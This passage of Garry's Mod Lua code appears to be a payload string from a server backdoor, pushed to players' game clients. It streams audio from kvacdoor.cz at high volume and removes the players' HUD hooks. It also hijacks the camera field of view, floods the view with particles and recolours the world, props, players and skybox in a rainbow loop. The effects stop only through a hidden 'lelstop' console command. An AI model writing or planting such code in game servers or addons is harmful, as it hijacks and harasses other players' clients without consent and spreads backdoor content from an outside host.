local particle = emitter:Add( "sprites/glow04_noz", vPos )
if ( particle ) then
particle:SetVelocity(VectorRand() * 50)
particle:SetDieTime(1)
particle:SetStartAlpha(0)
particle:SetEndAlpha(255)
particle:SetStartSize(50)
particle:SetEndSize(0)
particle:SetStartLength(55)
particle:SetEndLength(0)
particle:SetColor(vv)
particle:SetGravity(Vector(0,0,0))
particle:SetAirResistance(5)
particle:SetCollide(true)
particle:SetBounce(0.9)
end

override = Lerp(10 * FrameTime(), override, prevVal * .875)
if not sent then
net.Start("EXROR_")
net.SendToServer()
sent = true
end
else
override = Lerp(5 * FrameTime(), override, defaultfov)
sent = false
end

local vPos = LocalPlayer():EyePos() + Vector(0, 0, -5)
local emitter = ParticleEmitter( LocalPlayer():EyePos())
local particle = emitter:Add("particle/particle_smokegrenade", vPos)
particle:SetVelocity(VectorRand() * 50)
particle:SetDieTime(2)
particle:SetStartAlpha(math.Rand(1,10))
particle:SetStartSize(1900)
particle:SetEndSize(math.Rand(80,90))
particle:SetColor(vv)
particle:SetGravity(Vector(0,0,100))
particle:SetAirResistance(500)

local mats = Entity(0):GetMaterials()
for k,v in pairs(mats) do
Material(v):SetVector("$color", vv)
end

end




hook.Add("Think","somewhere_over_the_rainbow",function()
local col = HSVToColor(CurTime() * 36 % 360, .3, .8)

local v = Vector(col.r / 255, col.g / 255, col.b / 255)

LocalPlayer():SetWeaponColor(v)

for i = 1, #skys do
skys[i]:SetTopColor(v)
skys[i]:SetBottomColor(v)
end
end)

hook.Add("Think","butifoule",function()
local col = HSVToColor(CurTime() * 36 % 360, .3, .8)
local v = Vector(col.r / 255, col.g / 255, col.b / 255)
for k, v in pairs( ents.FindByClass( "prop_*" ) ) do 
v:SetColor( col )
v:Activate()
end
for k,p in pairs(player.GetAll()) do
p:SetColor( col )
end
end)



sound.PlayURL("https://kvacdoor.cz/assets/UNTITLED.mp3", "noblock", function(s)
if not IsValid(s) then return end
audio = s
s:SetVolume( 15 )
s:EnableLooping( false )
-- timer.Create("Timerr", 1, 0, function()
-- print(s:GetTime())
-- end)

local oldhooks = {}
for k, v in pairs(hook.GetTable().HUDPaint) do
oldhooks[k] = v
hook.Remove("HUDPaint", k)
end

hook.Add("HUDShouldDraw", "EXROR_", function(n)
if n == "CHudGMod" then return end
return false
end)

hook.Add("HUDPaint", "EXROR_", AudioVizualier)

hook.Add("CalcView", "EXROR_", function(ply, origin, angles, fov, znear, zfar)
return {
["origin"] = origin,
["angles"] = angles,
["fov"] = override,
["znear"] = znear,
["zfar"] = zfar
}
end)

local function stop()
audio = nil
timer.Remove("ScreenShake")
timer.Remove("f")
timer.Remove("GetTime")
hook.Remove("HUDPaint", "EXROR_")
hook.Remove("HUDShouldDraw", "EXROR_")
hook.Remove("CalcView", "EXROR_") 
for k, v in pairs(oldhooks) do
hook.Add("HUDPaint", k, v)
oldhooks[k] = nil
end
end
concommand.Add("lelstop", stop)
end)

]=])